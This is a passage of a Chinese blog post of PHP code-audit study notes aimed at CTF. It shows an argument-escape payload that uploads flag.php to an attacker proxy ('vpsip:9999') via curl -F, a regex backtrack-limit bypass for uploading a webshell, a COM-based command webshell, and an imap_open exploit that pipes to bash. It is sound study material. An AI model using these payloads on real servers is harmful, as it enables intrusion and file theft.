+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="s2">&#34;http&#34;</span> <span class="o">===</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$urlInfo</span><span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">])</span> <span class="o">||</span> <span class="s2">&#34;https&#34;</span><span class="o">===</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$urlInfo</span><span class="p">[</span><span class="s2">&#34;scheme&#34;</span><span class="p">]))){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span> <span class="s2">&#34;scheme error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;curl &#34;</span><span class="o">.</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在 curl 中存在 -F 提交表单的方法，也可以提交文件。 -F &lt;key=value&gt; 向服务器POST表单，例如： curl -F “web=@index.html;type=text/html” url.com 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了。目的构造的payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET请求：
+</span></span><span class="line"><span class="cl">http://url?flag=aabg7XSs&amp;hongri=QNKCDZO&amp;url=http://baidu.com/ -F file=@/var/www/html/flag.php -x vpsip:9999
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">POST请求：
+</span></span><span class="line"><span class="cl">_GET[flag]=aabg7XSs&amp;_GET[hongri]=QNKCDZO&amp;_GET[url]=http://baidu.com/ -F file=@/var/www/html/flag.php -x vpsip:9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但需要用到escapeshellarg和escapeshellcmd来完成参数逃逸，最后构造的payload为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET请求：
+</span></span><span class="line"><span class="cl">http://url?flag=aabg7XSs&amp;hongri=QNKCDZO&amp;url=http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vpsip:9999
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">POST请求：
+</span></span><span class="line"><span class="cl">_GET[flag]=aabg7XSs&amp;_GET[hongri]=QNKCDZO&amp;_GET[url]=http://baidu.com/’ -F file=@/var/www/html/flag.php -x vpsip:9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实际传入的为：</p>
+<pre class="wp-block-code"><code>‘http://www.baidu.com/’\\’’ -F file=@/var/www/html/flag.php -x vpsip:9999\’</code></pre>
+<h2 id="0x06-正则匹配相关问题">0x06 正则匹配相关问题</h2>
+<p>例题代码</p>
+<pre class="wp-block-code"><code>&lt;?php
+function is_php($data){
+    return preg_match('/&lt;\?.*&#91;(`;?>].*/is', $data);
+}
+
+if(empty($_FILES)) {
+    die(show_source(__FILE__));
+}
+
+$user_dir = 'data/' . md5($_SERVER&#91;'REMOTE_ADDR']);
+$data = file_get_contents($_FILES&#91;'file']&#91;'tmp_name']);
+if (is_php($data)) {
+    echo "bad request";
+} else {
+    @mkdir($user_dir, 0755);
+    $path = $user_dir . '/' . random_int(0, 10) . '.php';
+    move_uploaded_file($_FILES&#91;'file']&#91;'tmp_name'], $path);
+
+    header("Location: $path", true, 303);
+}</code></pre>
+<p>在<a rel="noreferrer noopener" href="https://regexper.com/" target="_blank" rel="nofollow" ><a href="https://regexper.com/" target="_blank" rel="noopener noreffer ">https://regexper.com/</a></a>输入<code>/&lt;\?.&lt;em&gt;[(`;?&gt;].&lt;/em&gt;/i</code>，可以在线生成可视化的图像，方便分析。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="474" height="255" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-312.png" alt="" class="wp-image-3438" /> </figure></p>
+<p><strong>正则表达式的贪婪与非贪婪模式</strong></p>
+<p>String str=&ldquo;abcaxc&rdquo;;<br>
+Patter p=&ldquo;ab.*c&rdquo;;</p>
+<p>贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。如上面使用模式p匹配字符串str，结果就是匹配到：abcaxc(ab.*c)。<br>
+非贪婪匹配：就是匹配到结果就好，就少的匹配字符。如上面使用模式p匹配字符串str，结果就是匹配到：abc(ab.*c)。</p>
+<p>量词：</p>
+<pre class="wp-block-code"><code>{m,n}：m到n个
+*：任意多个
++：一个到多个
+？：0或一个</code></pre>
+<p>源字符串: aaab 正则: .*?b</p>
+<p>匹配过程开始的时候, “.*?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.*?”, 这个时候, “.*?”匹配一个字符”a”,并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1373" height="580" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-313.png" alt="" class="wp-image-3441" /> </figure></p>
+<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。</p>
+<p>当超过回溯次数上限后，函数返回值会变成false而不是0或者1。可以利用这个漏洞绕过正则匹配，上传一句话木马。</p>
+<pre class="wp-block-code"><code>&lt;?php 
+$a = '&lt;?php phpinfo();//'.str_repeat('a', 9999996);
+file_put_contents('exp.php', $a);
+?></code></pre>
+<h2 id="0x07-disable_function绕过">0x07 Disable_function绕过</h2>
+<p><strong>黑名单绕过</strong></p>
+<p>phpinfo的disable_functions显示禁用的函数，不在列表之中，例如system exec shell_exec等被禁用了，但是可以用assert等代替。或者scandir等用其他函数实现需要的功能。</p>
+<p><strong>扩展使用</strong></p>
+<p>windows下COM（系统组件）</p>
+<pre class="wp-block-code"><code>&lt;?php 
+$command = $_GET&#91;'a'];
+$wsh = new COM('WScript.shell');//生成一个COM对象 Shell.Application也可
+$exec = $wsh->exec("cmd /c".$command);//调用对象方法来执行命令
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadALL();
+echo $stroutput;
+?></code></pre>
+<p>pcntl 扩展</p>
+<p><code>pcntl_exec</code> ，在当前进程空间执行指定程序。</p>
+<p>imap_open()</p>
+<p>i<code>map_open</code> ,Open an IMAP stream to a mailbox，公开的exp如下：</p>
+<pre class="wp-block-code"><code>&lt;?php
+$payload = "echo fsfasaf|tee /tmp/2.txt";
+$encoded = base64_encode($payload);
+$mailbox = "any -o ProxyCommand=echo\t".$encoded."|base64\t-d|bash";
+@imap_open('{'.$mailbox.'}:143/imap}INBOX', '', '');
+?></code></pre>
+<p>还有ImageMagic等，其实就是一些不在列表之中，但是又能执行命令的函数。</p>
+<p><strong>LD_PRELOAD</strong></p>
+<p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1384" height="615" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-316.png" alt="" class="wp-image-3452" /> </figure></p>
+<p>a.c gcc a.c -o a<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-317.png" alt="" class="wp-image-3453" width="437" height="244" /> </figure></p>
+<p>gcc -fPIC -shared b.c -o b.so，然后export LD_PRELOAD=&quot;./b.so&quot;<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-318.png" alt="" class="wp-image-3454" width="695" height="123" /> </figure></p>
+<p>strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1116" height="371" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-319.png" alt="" class="wp-image-3455" /> </figure></p>
+<p>readelf -Ws /usr/sbin/sendmail<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1233" height="439" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-322.png" alt="" class="wp-image-3458" /></figure></p>
+<h2 id="0x08-找源码扫描fuzz">0x08 找源码、扫描、FUZZ</h2>
+<pre class="wp-block-code"><code>右键源代码
+
+代码压缩包泄漏
+
+.git源码
+https:&#47;&#47;github.com/lijiejie/GitHack
+.DS_Store泄漏
+https://github.com/lijiejie/ds_store_exp
+SVN代码泄漏
+https://github.com/kost/dvcs-ripper
+
+敏感信息--Robots.txt
+
+备份文件--Index.php.bak,Index.php.swp</code></pre>
+<p>dirsearch、御剑等等</p>
+<p>FUZZ例题</p>
+<pre class="wp-block-code"><code>&lt;?php
+$action = $_GET&#91;'action'] ?? '';
+$arg = $_GET&#91;'arg'] ?? '';
+
+if(preg_match('/^&#91;a-z0-9_]*$/isD', $action)) {
+    show_source(__FILE__);
+} else {
+    $action('', $arg);
+}</code></pre>
+<p>bp的intruder模块设置action=$%00$var_dump测试，<code>%5c</code>时通过。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-04-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛PHP代码审计学习笔记" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛PHP代码审计学习笔记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛PHP代码审计学习笔记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-04-25-%E5%AE%89%E5%85%A8%E7%89%9Bphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛PHP代码审计学习笔记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="prev" rel="prev" title="安全牛XXE学习笔记"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>安全牛XXE学习笔记</a>
+            <a href="/2021-04-29-%E5%AE%89%E5%85%A8%E7%89%9Brsa%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="next" rel="next" title="RSA学习笔记">RSA学习笔记<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
